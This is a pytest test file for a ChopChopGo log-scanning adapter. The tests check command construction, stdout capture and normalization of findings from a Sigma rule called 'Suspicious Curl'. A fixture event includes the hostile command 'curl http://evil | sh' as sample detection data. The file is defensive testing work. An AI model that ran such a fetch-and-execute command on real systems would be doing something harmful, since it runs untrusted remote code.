"""Tests for the ChopChopGo adapter — command construction, stdout capture, normalize."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from app.tools.chopchopgo import ChopChopGoAdapter


@pytest.fixture
def chop_env(tmp_path: Path):
    """Fake chopchopgo binary + a sigma rules dir with one identifiable rule."""
    binary = tmp_path / "chopchopgo"
    binary.write_text("#!/bin/sh\n")
    os.chmod(binary, 0o755)
    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "susp_curl.yml").write_text("title: Suspicious Curl\nid: 11111111-2222-3333-4444-555555555555\nlevel: high\ndetection:\n  condition: sel\n")
    log = tmp_path / "messages.log"
    log.write_text("Jan  5 12:00:00 host1 su: failed\n")
    return binary, rules, log


def _adapter(binary: Path, rules: Path, **extra) -> ChopChopGoAdapter:
    return ChopChopGoAdapter({"tool_path": str(binary), "rules_path": str(rules), **extra})


def _event(title="Suspicious Curl", rule_id="11111111-2222-3333-4444-555555555555", **over):
    ev = {
        "Timestamp": "2024-01-05T12:00:00Z",
        "Message": "curl http://evil | sh",
        "User": "root",
        "Exe": "/usr/bin/curl",
        "PID": "1234",
        "Tags": ["attack.execution"],
        "Author": "someone",
        "ID": rule_id,
        "Title": title,
    }
    ev.update(over)
    return ev


# ── command construction ────────────────────────────────────────────────────


def test_cmd_target_derived_from_log_type(chop_env, tmp_path):
    binary, rules, log = chop_env
    adapter = _adapter(binary, rules)
    adapter._log_type = "auditd"
    cmd, err = adapter._build_local_cmd(binary, log, tmp_path / "out.json")
    assert err == ""
    assert cmd[:3] == [str(binary), "-target", "auditd"]
    assert "-rules" in cmd and "-file" in cmd
    assert cmd[cmd.index("-out") + 1] == "json"


def test_cmd_unsupported_log_type_falls_back_to_syslog(chop_env, tmp_path):
    """journald is not a supported ChopChopGo target (live-only); fall back to syslog."""
    binary, rules, log = chop_env
    adapter = _adapter(binary, rules)
    adapter._log_type = "journald"
    cmd, _ = adapter._build_local_cmd(binary, log, tmp_path / "out.json")
    assert cmd[cmd.index("-target") + 1] == "syslog"


def test_cmd_target_defaults_to_syslog(chop_env, tmp_path):
    binary, rules, log = chop_env
    adapter = _adapter(binary, rules)
    cmd, _ = adapter._build_local_cmd(binary, log, tmp_path / "out.json")
    assert cmd[cmd.index("-target") + 1] == "syslog"


def test_cmd_target_config_override(chop_env, tmp_path):
    binary, rules, log = chop_env
    adapter = _adapter(binary, rules, target="auditd")
    adapter._log_type = "syslog"
    cmd, _ = adapter._build_local_cmd(binary, log, tmp_path / "out.json")
    assert cmd[cmd.index("-target") + 1] == "auditd"


def test_cmd_mapping_flag_when_configured(chop_env, tmp_path):
    binary, rules, log = chop_env
    mapping = tmp_path / "mapping.yml"
    mapping.write_text("fields: {}\n")
    adapter = _adapter(binary, rules, mapping_path=str(mapping))
    cmd, _ = adapter._build_local_cmd(binary, log, tmp_path / "out.json")
    assert cmd[cmd.index("-mapping") + 1] == str(mapping)


def test_cmd_default_mapping_next_to_binary(chop_env, tmp_path):
    """Without mapping_path config, a mappings/<target>.yml beside the binary is used."""
    binary, rules, log = chop_env
    mappings = binary.parent / "mappings"
    mappings.mkdir()
    (mappings / "auditd.yml").write_text("fields: {}\n")
    adapter = _adapter(binary, rules)
    adapter._log_type = "auditd"
    cmd, _ = adapter._build_local_cmd(binary, log, tmp_path / "out.json")
    assert cmd[cmd.index("-mapping") + 1] == str(mappings / "auditd.yml")


def test_cmd_no_mapping_flag_when_none_available(chop_env, tmp_path):
    binary, rules, log = chop_env
    adapter = _adapter(binary, rules)
    adapter._log_type = "auditd"
    cmd, _ = adapter._build_local_cmd(binary, log, tmp_path / "out.json")
    assert "-mapping" not in cmd


def test_cmd_missing_binary_errors(chop_env, tmp_path):
    _, rules, log = chop_env
    missing = tmp_path / "nope"
    adapter = _adapter(missing, rules)
    cmd, err = adapter._build_local_cmd(missing, log, tmp_path / "out.json")
    assert cmd is None
    assert "not found" in err


def test_output_filename_suffix(chop_env):
    binary, rules, _ = chop_env
    adapter = _adapter(binary, rules)
    assert adapter._output_filename(Path("/x/messages.log")) == "messages_chopchopgo.json"


def test_supported_types():
    # journald is intentionally excluded — ChopChopGo's journald target reads the
    # live systemd journal only and rejects -file, so it cannot process uploads.
    assert {"auditd", "syslog"} == ChopChopGoAdapter.SUPPORTED_TYPES


# ── stdout capture → output file ────────────────────────────────────────────


def test_stdout_json_written_to_output_file(chop_env, tmp_path, monkeypatch):
    binary, rules, _log = chop_env
    adapter = _adapter(binary, rules)
    payload = json.dumps([_event()])
    monkeypatch.setattr(adapter, "_exec", lambda cmd, timeout, **kw: (0, payload, ""))
    out = tmp_path / "out" / "messages_chopchopgo.json"
    out.parent.mkdir()
    result = adapter._execute_and_parse(["fake"], out)
    assert result.success
    assert len(result.findings) == 1
    assert json.loads(out.read_text()) == [_event()]


def test_stdout_banner_noise_tolerated(chop_env, tmp_path, monkeypatch):
    binary, rules, _log = chop_env
    adapter = _adapter(binary, rules)
    noisy = "ChopChopGo v1.1.0\nScanning...\n" + json.dumps([_event()]) + "\nDone.\n"
    monkeypatch.setattr(adapter, "_exec", lambda cmd, timeout, **kw: (0, noisy, ""))
    out = tmp_path / "out.json"
    result = adapter._execute_and_parse(["fake"], out)
    assert result.success
    assert len(result.findings) == 1
    assert json.loads(out.read_text())[0]["Title"] == "Suspicious Curl"


def test_stdout_no_json_is_zero_findings(chop_env, tmp_path, monkeypatch):
    binary, rules, _log = chop_env
    adapter = _adapter(binary, rules)
    monkeypatch.setattr(adapter, "_exec", lambda cmd, timeout, **kw: (0, "no matches\n", ""))
    result = adapter._execute_and_parse(["fake"], tmp_path / "out.json")
    assert result.success
    assert result.findings == []


def test_nonzero_exit_is_failure(chop_env, tmp_path, monkeypatch):
    binary, rules, _log = chop_env
    adapter = _adapter(binary, rules)
    monkeypatch.setattr(adapter, "_exec", lambda cmd, timeout, **kw: (2, "", "boom"))
    result = adapter._execute_and_parse(["fake"], tmp_path / "out.json")
    assert not result.success
    assert "boom" in result.error


# ── normalize ───────────────────────────────────────────────────────────────


def test_normalize_groups_by_title(chop_env):
    binary, rules, _ = chop_env
    adapter = _adapter(binary, rules)
    findings = adapter.normalize([_event(), _event(Message="second hit")])
    assert len(findings) == 1
    f = findings[0]
    assert f.rule_name == "Suspicious Curl"
    assert f.count == 2
    assert f.rule_id == "11111111-2222-3333-4444-555555555555"
    assert f.tags == ["attack.execution"]
    assert len(f.details) == 2


def test_normalize_severity_from_rule_yaml(chop_env):
    binary, rules, _ = chop_env
    adapter = _adapter(binary, rules)
    findings = adapter.normalize([_event()])
    assert findings[0].severity == "high"
    assert "Suspicious Curl" in findings[0].rule_content


def test_normalize_unknown_rule_falls_back_to_informational(chop_env):
    binary, rules, _ = chop_env
    adapter = _adapter(binary, rules)
    findings = adapter.normalize([_event(title="Ghost Rule", rule_id="99999999-0000-0000-0000-000000000000")])
    assert findings[0].severity == "informational"
    assert findings[0].rule_content == ""


def test_normalize_details_capped(chop_env):
    binary, rules, _ = chop_env
    adapter = _adapter(binary, rules, max_finding_details=2)
    findings = adapter.normalize([_event(Message=f"hit {i}") for i in range(5)])
    assert findings[0].count == 5
    assert len(findings[0].details) == 2


def test_normalize_non_list_is_empty(chop_env):
    binary, rules, _ = chop_env
    adapter = _adapter(binary, rules)
    assert adapter.normalize({"not": "a list"}) == []
    assert adapter.normalize(None) == []
